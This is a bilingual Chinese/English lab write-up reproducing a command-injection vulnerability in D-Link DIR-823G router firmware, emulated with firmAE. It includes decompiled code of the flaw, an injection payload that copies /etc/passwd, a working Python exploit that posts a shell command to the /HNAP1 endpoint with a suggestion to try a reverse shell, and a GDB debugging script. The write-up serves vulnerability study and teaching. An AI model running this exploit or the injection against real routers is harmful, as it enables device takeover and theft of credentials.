# D-Link-DIR-823g漏洞复现/English version at the bottom

1、拿到固件后，我们先提取出来，并分析

~~~apl
binwalw -Me DIR823G_V1.0.2B05_20181207.bin  #  提取固件
cd squashfs-roo/  #  进入目录中
ls etc/init.d/  #  查看该目录下有无开机启动项  回显会看到 两个文件   rcS  rcS_GW
cat etc/init.d/rcS  #  查看开机启动项  在最下面我们会看到 'goahead &' 服务
ls | grep goahead  #  去 bin 目录下查看是否存在
binwalk DIR823G_V1.0.2B05_20181207.bin  #  Squashfs filesystem, little endian,得知文件系统是 Squashfs的系统的
checksec is823g/squashfs-root/bin/goahead  #  使用 checksec 发现是 mips 架构小端
~~~

2、使用`firmAE`启动服务

~~~apl
sudo ./run.sh -d dlink ./firmwares/../../../gujian/823g/DIR823G_V1.0.2B05_20181207.bin
#  -d 调试模式 
#  目标:在固件服务进程启动后，允许你用 GDB 或其他调试器连接到它，进行单步执行、查看寄存器和内存等操作。
#  用途:当你在分析模式下发现了一个潜在的崩溃或可疑代码路径时，可以使用此模式进行深入的动态分析。
~~~



![](/Image/823g-1.png)



3、浏览器访问`ip`地址，`http://192.168.0.1` ，看到以下界面就是访问成功

![](/Image/823g-2.png)

4、跳过向导后我们可以去尝试使用弱密码登录一下，一是可以验证弱密码登录是否可以成功，二是可以看一下传输路径

![](/Image/823g-4.png)

5、使用`burpsuite`抓包验证

![](/Image/823g-5.png)

6、把`goahead`二进制服务丢入IDA静态分析

~~~apl
#  通过搜索关键字 HANP1 会得到相关函数 sub_40B1F4 
#  通过关联可以进一步得到函数  sub_42383C（存在命令注入漏洞）
~~~

![](/Image/823g-6.png)

~~~C
//  v13: 缓冲区，大小为 5000 字节（因为 sizeof(v13) 假设是 5000）
memset(v13, 0, sizeof(v13));
//  将用户输入 a7 格式化拼接到命令字符串中
snprintf(v13, 4999, "echo '%s' >/var/hnaplog", a7);
//  执行拼接后的命令字符串
system(v13);
//  攻击原理
//  如果攻击者能够控制输入参数 a7 的内容，他们就可以利用 Shell 的命令分隔符（如 ;, &, |, &&, || 等）来终止原始的 echo 命令，并注入执行任意的系统命令。

//  攻击 Payload 示例
//  假设攻击者发送的 a7 内容如下：

//  test_log'; cat /etc/passwd > /tmp/pwned.txt; #
//  实际执行的命令
//  当 snprintf 拼接完成后，v13 变量的内容将是：

//  echo 'test_log'; cat /etc/passwd > /tmp/pwned.txt; #' >/var/hnaplog
//  system(v13) 执行时，Shell 会将其解析为三个独立的命令：

//  echo 'test_log': 原始 echo 命令被提前终止并执行。

//  cat /etc/passwd > /tmp/pwned.txt: 攻击者注入的恶意命令被执行，将系统密码文件内容复制到 /tmp。

//  # ' >/var/hnaplog: # 之后的都被视为注释（取决于 Shell），导致原始的重定向命令失效，但恶意命令已成功执行。

//  通过这种方式，攻击者可以执行任何设备允许的命令，包括读取敏感文件、修改配置、下载并运行恶意程序（后门）等，导致设备的完全沦陷 (Remote Code Execution, RCE)。
~~~

7、构造`exp`保存为`exp_823g.py`-------------可以尝试进行`revers_shell`

~~~python
import requests

ip = "192.168.0.1"

command = "'`echo 12345 > hack.txt`'"
length = len(command)

# headers = requests.utils.defaut_headers()
headers = requests.utils.default_headers()
headers["User-Agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0"
headers["Accept"]='*/*'
headers["Accept-Language"]="en-US,en;q=0.5"
headers["Accept-Encoding"]="gzip, deflate, br"
headers["Content-Type"]="text/xml; charset=utf-8"
headers["SOAPAction"]='"http://purenetworks.com/HNAP1/SetIgnoreWizardConfig"'
headers["Content-Length"]=str(length)

payload=command
r=requests.post('http://'+ip+'/HNAP1',headers=headers,data=payload)
~~~

8、gdb 动调验证

~~~apl
#  链接上 gdb 后设置断点 0x0042383C、0x00423A0C
#  打完断电后 C 运行并发送 exp 观察
~~~

![](/Image/823g-7.png)

![](/Image/823g-8.png)

9、验证是否成功

![](/Image/823g-9.png)

10、使用`burpsuite`发送

![](/Image/823g-10.png)

### 扩展

​	1.在使用 gdb 的时候会出现无 UI 的情况

​		这个情况是因为pwndbg插件没有挂载到gdb

需要修改你的 `../start.gdb` 脚本，将 Python 模块的 **正确父目录** 添加到 `sys.path` 中。

------



## 优化后的 GDB 启动脚本



请将你的 `../start.gdb` 脚本修改为以下内容。我使用了**绝对路径**和**正确的 Python 模块父目录**来确保修复生效：

代码段

```Python
# -----------------------------------------------
# 1. 修复 ModuleNotFoundError: 确保 Python 路径包含 site-packages 目录
# -----------------------------------------------
python
import sys
# 这是包含 'pwndbg' 模块文件夹的父目录！
PWNDBG_MODULE_PATH = '/usr/lib/pwndbg-gdb/lib/python3.12/site-packages/'

# 只有目录存在时才添加，更健壮
if PWNDBG_MODULE_PATH not in sys.path:
    sys.path.insert(0, PWNDBG_MODULE_PATH)
end
# -----------------------------------------------

# 2. 强制加载 Pwndbg 插件
source /usr/lib/pwndbg-gdb/exe/gdbinit.py

# 3. 架构设置
set architecture mips
set endian little

# 4. 符号和库路径修正 (请替换为本地固件的绝对路径!)
set sysroot /home/iot/tenda_rootfs
set solib-search-path /home/iot/tenda_rootfs/lib:/home/iot/tenda_rootfs/usr/lib

# 5. 连接与执行
target remote 192.168.0.1:1337
b *0x0042383c
b *0x00423a0c
```

------

# **D-Link-DIR-823g Vulnerability Reproduction**

1. After obtaining the firmware, extract and analyze it.

```apl
binwalk -Me DIR823G_V1.0.2B05_20181207.bin  # Extract firmware
cd squashfs-root/  # Enter the directory
ls etc/init.d/  # Check if there are startup scripts in this directory; output shows two files: rcS and rcS_GW
cat etc/init.d/rcS  # View startup scripts; at the bottom, you will see 'goahead &'
ls | grep goahead  # Check in the bin directory to see if it exists
binwalk DIR823G_V1.0.2B05_20181207.bin  # "Squashfs filesystem, little endian" indicates the file system is Squashfs
checksec is823g/squashfs-root/bin/goahead  # Use checksec to confirm it’s MIPS little-endian architecture
```



1. Start the service using firmAE.

```apl
sudo ./run.sh -d dlink ./firmwares/../../../gujian/823g/DIR823G_V1.0.2B05_20181207.bin
# -d: Debug mode
# Purpose: After the firmware service process starts, you can connect to it with GDB or other debuggers
# to perform single-step execution, inspect registers and memory, etc.
# Use: When you find a potential crash or suspicious code path during analysis mode,
# you can use this mode for deeper dynamic analysis.
```



![](/Image/823g-1.png)

1. Open a browser and visit http://192.168.0.1.

   Seeing the following interface means access was successful.

![](/Image/823g-2.png)

1. After skipping the setup wizard, try logging in using a weak password.

   This can both verify weak password access and allow you to observe the transmission path.

![](/Image/823g-4.png)

1. Use BurpSuite to capture and verify packets.

![](/Image/823g-5.png)

1. Load the goahead binary into IDA for static analysis.

```apl
# Search for the keyword HANP1 to locate the related function sub_40B1F4
# Through correlation, you can further find the function sub_42383C (contains command injection vulnerability)
```



![](/Image/823g-6.png)

```apl
// v13: Buffer, size 5000 bytes (since sizeof(v13) is assumed 5000)
memset(v13, 0, sizeof(v13));
// Format and concatenate user input a7 into the command string
snprintf(v13, 4999, "echo '%s' >/var/hnaplog", a7);
// Execute the concatenated command string
system(v13);
// Attack principle:
// If an attacker can control the input parameter a7, they can exploit shell command separators (;, &, |, &&, ||, etc.)
// to terminate the original echo command and inject arbitrary system commands.

// Attack Payload Example:
// Suppose the attacker sends the following a7 content:

// test_log'; cat /etc/passwd > /tmp/pwned.txt; #
// Actual command executed:
// After snprintf concatenation, the v13 variable content will be:

// echo 'test_log'; cat /etc/passwd > /tmp/pwned.txt; #' >/var/hnaplog
// When system(v13) executes, the shell interprets it as three separate commands:

// echo 'test_log': Original echo command ends early and executes.
// cat /etc/passwd > /tmp/pwned.txt: Attacker-injected malicious command executes, copying the system password file to /tmp.
// # ' >/var/hnaplog: Everything after # is treated as a comment (depending on shell), disabling the original redirect, but the malicious command has already executed.

// This allows attackers to execute any command permitted by the device, including reading sensitive files,
// modifying configurations, downloading and executing backdoors, etc., leading to full device compromise (RCE).
```



1. Construct exp and save as exp_823g.py — attempt reverse shell if desired.

```python
import requests

ip = "192.168.0.1"

command = "'`echo 12345 > hack.txt`'"
length = len(command)

# headers = requests.utils.defaut_headers()
headers = requests.utils.default_headers()
headers["User-Agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0"
headers["Accept"]='*/*'
headers["Accept-Language"]="en-US,en;q=0.5"
headers["Accept-Encoding"]="gzip, deflate, br"
headers["Content-Type"]="text/xml; charset=utf-8"
headers["SOAPAction"]='"http://purenetworks.com/HNAP1/SetIgnoreWizardConfig"'
headers["Content-Length"]=str(length)

payload=command
r=requests.post('http://'+ip+'/HNAP1',headers=headers,data=payload)
```



1. Verify dynamically using gdb.

```apl
# After connecting to gdb, set breakpoints at 0x0042383C and 0x00423A0C
# After setting breakpoints, run (C) and send the exploit to observe behavior
```



![](/Image/823g-7.png)

![](/Image/823g-8.png)

1. Verify whether the attack was successful.

![](/Image/823g-9.png)

1. Send using BurpSuite.

![](/Image/823g-10.png)

### **Extension**

1. When using gdb, a “no UI” issue may appear.

   This occurs because the pwndbg plugin is not attached to gdb.

Modify your ../start.gdb script and add the correct parent directory of the Python module to sys.path.

------

## **Optimized GDB Startup Script**



Please modify your ../start.gdb script as follows.

This uses **absolute paths** and **correct Python parent directory** to ensure the fix works.

```apl
# -----------------------------------------------
# 1. Fix ModuleNotFoundError: Ensure Python path includes the site-packages directory
# -----------------------------------------------
python
import sys
# This is the parent directory containing the 'pwndbg' module folder!
PWNDBG_MODULE_PATH = '/usr/lib/pwndbg-gdb/lib/python3.12/site-packages/'

# Only add if the directory exists; more robust
if PWNDBG_MODULE_PATH not in sys.path:
    sys.path.insert(0, PWNDBG_MODULE_PATH)
end
# -----------------------------------------------

# 2. Force load the Pwndbg plugin
source /usr/lib/pwndbg-gdb/exe/gdbinit.py

# 3. Architecture setup
set architecture mips
set endian little

# 4. Fix symbol and library paths (replace with local firmware absolute paths!)
set sysroot /home/iot/tenda_rootfs
set solib-search-path /home/iot/tenda_rootfs/lib:/home/iot/tenda_rootfs/usr/lib

# 5. Connect and execute
target remote 192.168.0.1:1337
b *0x0042383c
b *0x00423a0c
```

